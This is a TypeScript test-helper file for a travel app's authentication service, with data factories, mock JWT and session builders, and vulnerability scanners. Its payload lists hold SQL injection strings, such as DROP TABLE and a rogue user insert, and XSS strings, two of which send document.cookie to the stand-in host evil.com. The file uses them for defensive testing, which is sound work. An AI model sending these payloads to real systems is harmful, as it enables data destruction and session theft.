import { faker } from '@faker-js/faker';
import { createTimestamp } from '@/services/auth/functional/types';
import { CreateUserProfile } from '@/schemas/user';
import { RegisterRequest, LoginRequest } from '@/schemas/auth';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import { v4 as uuidv4 } from 'uuid';

/**
 * Test data factory for creating realistic test data
 */
export class TestDataFactory {
  /**
   * Generate a valid user profile for testing
   */
  static createUserProfile(overrides?: Partial<CreateUserProfile>): CreateUserProfile {
    return {
      firstName: faker.person.firstName(),
      lastName: faker.person.lastName(),
      email: faker.internet.email().toLowerCase(),
      preferences: {
        currency: 'CAD',
        timezone: 'America/Toronto',
        preferredDepartureAirport: faker.helpers.arrayElement(['YYZ', 'YVR', 'YUL', 'YYC']),
        communicationFrequency: faker.helpers.arrayElement(['immediate', 'daily', 'weekly'] as const),
        subscriptionTier: 'free',
      },
      ...overrides,
    };
  }

  /**
   * Generate a valid registration request
   */
  static createRegisterRequest(overrides?: Partial<RegisterRequest>): RegisterRequest {
    const password = this.generateSecurePassword();
    const userProfile = this.createUserProfile();

    return {
      firstName: userProfile.firstName,
      lastName: userProfile.lastName,
      email: userProfile.email,
      password,
      confirmPassword: password,
      acceptTerms: true,
      marketingOptIn: faker.datatype.boolean(),
      ...overrides,
    };
  }

  /**
   * Generate a valid login request
   */
  static createLoginRequest(overrides?: Partial<LoginRequest>): LoginRequest {
    return {
      email: faker.internet.email().toLowerCase(),
      password: this.generateSecurePassword(),
      rememberMe: faker.datatype.boolean(),
      deviceInfo: {
        userAgent: faker.internet.userAgent(),
        ipAddress: faker.internet.ip(),
        fingerprint: faker.string.uuid(),
      },
      ...overrides,
    };
  }

  /**
   * Generate a secure password that meets all requirements
   */
  static generateSecurePassword(): string {
    const lowercase = faker.string.alpha({ length: 3, casing: 'lower' });
    const uppercase = faker.string.alpha({ length: 3, casing: 'upper' });
    const numbers = faker.string.numeric({ length: 2 });
    const special = faker.helpers.arrayElement(['!', '@', '#', '$', '%', '^', '&', '*']);

    return `${lowercase}${uppercase}${numbers}${special}`;
  }

  /**
   * Generate a weak password for testing validation
   */
  static generateWeakPassword(): string {
    return faker.string.alpha({ length: 5, casing: 'lower' });
  }

  /**
   * Generate SQL injection payloads for security testing
   */
  static getSQLInjectionPayloads(): string[] {
    return [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "' OR 1=1 --",
      "admin'--",
      "' UNION SELECT * FROM users --",
      "1' AND '1'='1",
      "' OR 'a'='a",
      "'; INSERT INTO users (email, password) VALUES ('hacker@evil.com', 'pwned'); --",
      "' OR EXISTS(SELECT * FROM users WHERE email='admin@example.com') --",
      "' AND 1=(SELECT COUNT(*) FROM tabname); --",
    ];
  }

  /**
   * Generate XSS payloads for security testing
   */
  static getXSSPayloads(): string[] {
    return [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<svg onload=alert("XSS")>',
      'javascript:alert("XSS")',
      '<body onload=alert("XSS")>',
      '"><script>alert("XSS")</script>',
      '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>',
      '<img src="x" onerror="fetch(\'http://evil.com/steal?data=\'+document.cookie)">',
      '${alert("XSS")}',
      '{{constructor.constructor("alert(1)")()}}',
    ];
  }

  /**
   * Generate malformed email addresses for testing
   */
  static getMalformedEmails(): string[] {
    return [
      'notanemail',
      '@example.com',
      'user@',
      'user@@example.com',
      'user@example',
      'user name@example.com',
      'user@.com',
      'user@example..com',
      '.user@example.com',
      'user.@example.com',
      'user@exam ple.com',
      'user@example.com.',
      'user@-example.com',
      'user@example-.com',
      'user@[123.456.789.012]',
      'user@example.com\0',
      'user@example.com\r\n',
    ];
  }

  /**
   * Generate edge case names for testing
   */
  static getEdgeCaseNames(): Array<{ name: string; description: string }> {
    return [
      { name: '', description: 'Empty string' },
      { name: ' ', description: 'Single space' },
      { name: '  ', description: 'Multiple spaces' },
      { name: '\t', description: 'Tab character' },
      { name: '\n', description: 'Newline character' },
      { name: 'a'.repeat(51), description: 'Exceeds 50 character limit' },
      { name: "O'Brien", description: 'Name with apostrophe' },
      { name: 'José', description: 'Name with accent' },
      { name: '李明', description: 'Chinese characters' },
      { name: 'محمد', description: 'Arabic characters' },
      { name: '🙂', description: 'Emoji' },
      { name: '<script>alert("xss")</script>', description: 'XSS attempt in name' },
      { name: 'Robert"; DROP TABLE users; --', description: 'SQL injection in name' },
      { name: '\0', description: 'Null character' },
      { name: '\\u0000', description: 'Unicode null' },
    ];
  }

  /**
   * Generate large payloads for testing size limits
   */
  static generateLargePayload(sizeInKB: number): string {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const targetSize = sizeInKB * 1024;
    let result = '';

    while (result.length < targetSize) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }

    return result;
  }

  /**
   * Generate rate limit test data
   */
  static generateRateLimitTestData(count: number): RegisterRequest[] {
    return Array.from({ length: count }, (_, index) =>
      this.createRegisterRequest({
        email: `ratelimit${index}@example.com`,
      })
    );
  }
}

/**
 * Authentication test helpers
 */
export class AuthTestHelpers {
  /**
   * Create a mock JWT token for testing
   */
  static createMockJWT(userId: string, email: string, sessionId?: string): string {
    const payload = {
      sub: userId,
      email,
      role: 'user',
      sessionId: sessionId || uuidv4(),
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor(Date.now() / 1000) + 3600,
      iss: 'agentic-travel-agent',
      aud: 'agentic-travel-agent-users',
    };

    return jwt.sign(payload, process.env.JWT_SECRET || 'test-secret');
  }

  /**
   * Create an expired JWT token for testing
   */
  static createExpiredJWT(userId: string, email: string): string {
    const payload = {
      sub: userId,
      email,
      role: 'user',
      sessionId: uuidv4(),
      iat: Math.floor(Date.now() / 1000) - 7200,
      exp: Math.floor(Date.now() / 1000) - 3600, // Expired 1 hour ago
      iss: 'agentic-travel-agent',
      aud: 'agentic-travel-agent-users',
    };

    return jwt.sign(payload, process.env.JWT_SECRET || 'test-secret');
  }

  /**
   * Create a malformed JWT token for testing
   */
  static createMalformedJWT(): string {
    return 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.payload';
  }

  /**
   * Hash a password for testing
   */
  static async hashPassword(password: string): Promise<string> {
    return bcrypt.hash(password, 12);
  }

  /**
   * Verify password hashing works correctly
   */
  static async verifyPasswordHash(password: string, hash: string): Promise<boolean> {
    return bcrypt.compare(password, hash);
  }

  /**
   * Generate device fingerprint for testing
   */
  static generateDeviceFingerprint(): string {
    return faker.string.alphanumeric(32);
  }

  /**
   * Create mock session data
   */
  static createMockSession(userId: string, email: string) {
    return {
      sessionId: uuidv4(),
      userId,
      user: {
        id: userId,
        email,
        firstName: faker.person.firstName(),
        lastName: faker.person.lastName(),
        isEmailVerified: true,
        role: 'user',
        createdAt: createTimestamp(),
      },
      createdAt: createTimestamp(),
      expiresAt: new Date(Date.now() + 3600000) as string,
      lastAccessedAt: new Date().toISOString(),
      ipAddress: faker.internet.ip(),
      userAgent: faker.internet.userAgent(),
      isActive: true,
      loginMethod: 'email' as const,
    };
  }
}

/**
 * Security test helpers
 */
export class SecurityTestHelpers {
  /**
   * Test for SQL injection vulnerabilities
   */
  static async testSQLInjection(
    testFn: (payload: string) => Promise<any>
  ): Promise<{ vulnerable: boolean; details: string[] }> {
    const vulnerabilities: string[] = [];
    const payloads = TestDataFactory.getSQLInjectionPayloads();

    for (const payload of payloads) {
      try {
        const result = await testFn(payload);

        // Check if the response indicates a SQL error
        if (this.containsSQLError(result)) {
          vulnerabilities.push(`SQL injection vulnerability detected with payload: ${payload}`);
        }
      } catch (error) {
        // Check if error reveals SQL structure
        if (error && this.containsSQLError(error)) {
          vulnerabilities.push(`SQL error exposed with payload: ${payload}`);
        }
      }
    }

    return {
      vulnerable: vulnerabilities.length > 0,
      details: vulnerabilities,
    };
  }

  /**
   * Test for XSS vulnerabilities
   */
  static async testXSS(
    testFn: (payload: string) => Promise<any>
  ): Promise<{ vulnerable: boolean; details: string[] }> {
    const vulnerabilities: string[] = [];
    const payloads = TestDataFactory.getXSSPayloads();

    for (const payload of payloads) {
      try {
        const result = await testFn(payload);

        // Check if the payload is reflected without encoding
        if (this.containsUnescapedPayload(result, payload)) {
          vulnerabilities.push(`XSS vulnerability detected with payload: ${payload}`);
        }
      } catch (error) {
        // Expected - XSS payloads should be rejected
      }
    }

    return {
      vulnerable: vulnerabilities.length > 0,
      details: vulnerabilities,
    };
  }

  /**
   * Check if response contains SQL error indicators
   */
  private static containsSQLError(obj: any): boolean {
    const sqlErrorPatterns = [
      /SQL/i,
      /syntax error/i,
      /mysql/i,
      /postgres/i,
      /sqlite/i,
      /ORA-\d+/,
      /DB2 SQL/i,
      /Microsoft.*ODBC/i,
      /SQLServer/i,
      /Incorrect syntax/i,
      /Unknown column/i,
      /Table.*doesn't exist/i,
    ];

    const objStr = JSON.stringify(obj);
    return sqlErrorPatterns.some((pattern) => pattern.test(objStr));
  }

  /**
   * Check if response contains unescaped payload
   */
  private static containsUnescapedPayload(obj: any, payload: string): boolean {
    const objStr = JSON.stringify(obj);

    // Check if the exact payload appears unescaped
    if (objStr.includes(payload)) {
      // Verify it's not properly escaped
      const escapedVersions = [
        payload.replace(/</g, '&lt;').replace(/>/g, '&gt;'),
        payload.replace(/"/g, '&quot;').replace(/'/g, '&#x27;'),
        encodeURIComponent(payload),
      ];

      return !escapedVersions.some((escaped) => objStr.includes(escaped));
    }

    return false;
  }

  /**
   * Test password entropy
   */
  static calculatePasswordEntropy(password: string): number {
    const charsets = {
      lowercase: /[a-z]/.test(password) ? 26 : 0,
      uppercase: /[A-Z]/.test(password) ? 26 : 0,
      numbers: /[0-9]/.test(password) ? 10 : 0,
      special: /[^a-zA-Z0-9]/.test(password) ? 32 : 0,
    };

    const totalChars = Object.values(charsets).reduce((a, b) => a + b, 0);
    return password.length * Math.log2(totalChars);
  }

  /**
   * Test for timing attacks
   */
  static async measureTimingAttack(
    testFn: () => Promise<any>,
    iterations: number = 100
  ): Promise<{ avgTime: number; variance: number }> {
    const times: number[] = [];

    for (let i = 0; i < iterations; i++) {
      const start = process.hrtime.bigint();
      await testFn();
      const end = process.hrtime.bigint();
      times.push(Number(end - start) / 1000000); // Convert to milliseconds
    }

    const avgTime = times.reduce((a, b) => a + b, 0) / times.length;
    const variance =
      times.reduce((sum, time) => sum + Math.pow(time - avgTime, 2), 0) / times.length;

    return { avgTime, variance };
  }
}

/**
 * Test assertions and custom matchers
 */
export class TestAssertions {
  /**
   * Assert that a password is properly hashed
   */
  static async assertPasswordIsHashed(password: string, hash: string): Promise<void> {
    // Hash should not be the same as the password
    expect(hash).not.toBe(password);

    // Hash should be bcrypt format ($2a$ or $2b$ prefix)
    expect(hash).toMatch(/^\$2[ab]\$/);

    // Should be able to verify the password
    const isValid = await bcrypt.compare(password, hash);
    expect(isValid).toBe(true);
  }

  /**
   * Assert that sensitive data is not exposed
   */
  static assertNoSensitiveDataExposed(response: any): void {
    const responseStr = JSON.stringify(response);

    // Should not contain password hashes
    expect(responseStr).not.toMatch(/\$2[ab]\$/);

    // Should not contain internal error details
    expect(responseStr).not.toMatch(/at\s+\w+\s+\(/); // Stack traces
    expect(responseStr).not.toMatch(/\/Users\//); // File paths
    expect(responseStr).not.toMatch(/node_modules/); // Internal paths

    // Should not contain database details
    expect(responseStr).not.toMatch(/mongodb:\/\//);
    expect(responseStr).not.toMatch(/postgres:\/\//);
    expect(responseStr).not.toMatch(/mysql:\/\//);
  }

  /**
   * Assert proper error response format
   */
  static assertErrorResponse(response: any, expectedCode: string): void {
    expect(response.body).toMatchObject({
      success: false,
      error: {
        code: expectedCode,
        message: expect.any(String),
        timestamp: expect.any(String),
      },
    });
  }

  /**
   * Assert proper success response format
   */
  static assertSuccessResponse(response: any): void {
    expect(response.body).toMatchObject({
      success: true,
      data: expect.any(Object),
    });
  }
}

/**
 * Performance test helpers
 */
export class PerformanceTestHelpers {
  /**
   * Measure endpoint response time
   */
  static async measureResponseTime(testFn: () => Promise<any>): Promise<number> {
    const start = process.hrtime.bigint();
    await testFn();
    const end = process.hrtime.bigint();
    return Number(end - start) / 1000000; // Convert to milliseconds
  }

  /**
   * Test endpoint under load
   */
  static async testUnderLoad(
    testFn: () => Promise<any>,
    concurrency: number,
    iterations: number
  ): Promise<{
    totalTime: number;
    avgTime: number;
    errors: number;
    successRate: number;
  }> {
    const start = process.hrtime.bigint();
    let errors = 0;

    const batches = Math.ceil(iterations / concurrency);

    for (let i = 0; i < batches; i++) {
      const batchSize = Math.min(concurrency, iterations - i * concurrency);
      const promises = Array(batchSize)
        .fill(null)
        .map(async () => {
          try {
            await testFn();
          } catch (error) {
            errors++;
          }
        });

      await Promise.all(promises);
    }

    const end = process.hrtime.bigint();
    const totalTime = Number(end - start) / 1000000;

    return {
      totalTime,
      avgTime: totalTime / iterations,
      errors,
      successRate: ((iterations - errors) / iterations) * 100,
    };
  }
}
